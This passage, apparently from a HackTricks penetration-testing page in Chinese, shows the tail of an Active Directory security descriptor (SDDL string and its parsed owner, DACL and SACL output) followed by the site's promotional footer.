5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告**吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
